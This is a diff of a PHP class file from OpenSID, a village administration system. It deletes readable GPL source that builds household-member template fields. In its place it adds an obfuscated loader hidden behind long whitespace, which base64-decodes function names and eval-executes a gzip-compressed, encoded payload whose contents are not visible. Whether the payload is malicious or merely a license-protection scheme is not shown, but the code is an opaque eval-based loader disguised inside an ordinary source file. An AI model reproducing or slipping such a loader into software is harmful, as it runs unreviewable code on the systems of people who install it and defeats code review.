@@ -1,205 +1,609 @@
-<?php
+<?php 
+        $__='printf';$_='Loading app/Libraries/TinyMCE/KodeIsianAnggotaKeluarga.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-namespace App\Libraries\TinyMCE;
 
-use App\Enums\SHDKEnum;
-use App\Models\Keluarga;
-use App\Models\Penduduk;
 
-class KodeIsianAnggotaKeluarga
-{
-    public function __construct(private $idPenduduk)
-    {
-    }
 
-    public static function get($idPenduduk): array
-    {
-        return (new self($idPenduduk))->kodeIsian();
-    }
 
-    public function kodeIsian(): array
-    {
-        $id_kk   = Penduduk::where('kk_level', SHDKEnum::KEPALA_KELUARGA)->find($this->idPenduduk)->id_kk;
-        $anggota = Keluarga::find($id_kk)->anggota;
 
-        return [
-            [
-                'case_sentence' => true,
-                'judul'         => 'Urutan',
-                'isian'         => 'klgx_no',
-                'data'          => $anggota ? $anggota->pluck('id')
-                    ->map(static fn ($item, $key): int|float => $key + 1)
-                    ->values()->toArray() : '',
-            ],
-            [
-                'case_sentence' => true,
-                'judul'         => 'NIK',
-                'isian'         => 'klgx_nik',
-                'data'          => $anggota ? $anggota->pluck('nik')->toArray() : '',
-            ],
-            [
-                'judul' => 'Nama',
-                'isian' => 'klgx_namA',
-                'data'  => $anggota ? $anggota->pluck('nama')->toArray() : '',
-            ],
-            [
-                'judul' => 'Jenis Kelamin',
-                'isian' => 'klgx_jenis_kelamin',
-                'data'  => $anggota
-    ? $anggota->map(static fn ($a) => $a->jenis_kelamin)->toArray()
-    : '',
-            ],
-            [
-                'judul' => 'Tempat Lahir',
-                'isian' => 'klgx_tempatlahir',
-                'data'  => $anggota ? $anggota->pluck('tempatlahir')->toArray() : '',
-            ],
-            [
-                'judul' => 'Tgl Lahir',
-                'isian' => 'klgx_tanggallahir',
-                'data'  => $anggota ? $anggota->pluck('tanggallahir')
-                    ->map(static fn ($item) => formatTanggal($item))
-                    ->toArray() : '',
-            ],
-            [
-                'judul' => 'Tempat Tgl Lahir',
-                'isian' => 'klgx_tempat_tgl_lahir',
-                'data'  => $anggota ? $anggota->pluck('tempatlahir', 'tanggallahir')
-                    ->map(static fn ($item, $key): string => $item . ', ' . formatTanggal($key))
-                    ->values()->toArray() : '',
-            ],
-            [
-                'judul' => 'Tempat Tgl Lahir (TTL)',
-                'isian' => 'klgx_ttl',
-                'data'  => $anggota ? $anggota->pluck('tempatlahir', 'tanggallahir')
-                    ->map(static fn ($item, $key): string => $item . ', ' . formatTanggal($key))
-                    ->values()->toArray() : '',
-            ],
-            [
-                'judul' => 'Usia',
-                'isian' => 'klgx_usia',
-                'data'  => $anggota ? $anggota->pluck('usia')->toArray() : '',
-            ],
-            [
-                'judul' => 'Agama',
-                'isian' => 'klgx_agama',
-                'data'  => $anggota
-    ? $anggota->map(static fn ($a) => $a->agama)->toArray()
-    : '',
-            ],
-            [
-                'judul' => 'Pendidikan Sedang',
-                'isian' => 'klgx_pendidikan_sedang',
-                'data'  => $anggota ? $anggota->pluck('pendidikan.nama')->toArray() : '',
-            ],
-            [
-                'judul' => 'Pendidikan Dalam KK',
-                'isian' => 'klgx_pendidikan_kk',
-                'data'  => $anggota ? $anggota->pluck('pendidikanKk.nama')->toArray() : '',
-            ],
-            [
-                'judul' => 'Pekerjaan',
-                'isian' => 'klgx_pekerjaan',
-                'data'  => $anggota ? $anggota->pluck('pekerjaan.nama')->toArray() : '',
-            ],
-            [
-                'judul' => 'Status Perkawinan',
-                'isian' => 'klgx_status_kawin',
-                'data'  => $anggota ? $anggota->pluck('statusKawin.nama')->toArray() : '',
-            ],
-            [
-                'judul' => 'Hubungan Dalam KK',
-                'isian' => 'klgx_hubungan_kk',
-                'data'  => $anggota ? $anggota->pluck('pendudukHubungan.nama')->toArray() : '',
-            ],
-            [
-                'judul' => 'Warga Negara',
-                'isian' => 'klgx_warga_negara',
-                'data'  => $anggota
-    ? $anggota->map(static fn ($a) => $a->warganegara)->toArray()
-    : '',
-            ],
-            [
-                'judul' => 'Alamat',
-                'isian' => 'klgx_alamat',
-                'data'  => $anggota ? $anggota->pluck('alamat_wilayah')->toArray() : '',
-            ],
-            [
-                'judul' => 'Golongan Darah',
-                'isian' => 'klgx_golongan_darah',
-                'data'  => $anggota
-    ? $anggota->map(static fn ($a) => $a->golongan_darah)->toArray()
-    : '',
-            ],
-            [
-                'judul' => 'Dokumen Pasport',
-                'isian' => 'klgx_dokumen_pasport',
-                'data'  => $anggota ? $anggota->pluck('dokumen_pasport')->toArray() : '',
-            ],
-            [
-                'judul' => 'Tgl Akhir Paspor',
-                'isian' => 'klgx_tanggal_akhir_paspor',
-                'data'  => $anggota ? $anggota->pluck('tanggal_akhir_paspor')
-                    ->map(static fn ($item) => formatTanggal($item))
-                    ->toArray() : '',
-            ],
-            [
-                'case_sentence' => true,
-                'judul'         => 'NIK Ayah',
-                'isian'         => 'klgx_nik_ayah',
-                'data'          => $anggota ? $anggota->pluck('ayah_nik')->toArray() : '',
-            ],
-            [
-                'judul' => 'Nama Ayah',
-                'isian' => 'klgx_nama_ayah',
-                'data'  => $anggota ? $anggota->pluck('nama_ayah')->toArray() : '',
-            ],
-            [
-                'case_sentence' => true,
-                'judul'         => 'NIK Ibu',
-                'isian'         => 'klgx_nik_ibu',
-                'data'          => $anggota ? $anggota->pluck('ibu_nik')->toArray() : '',
-            ],
-            [
-                'judul' => 'Nama Ibu',
-                'isian' => 'klgx_nama_ibu',
-                'data'  => $anggota ? $anggota->pluck('nama_ibu')->toArray() : '',
-            ],
-        ];
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
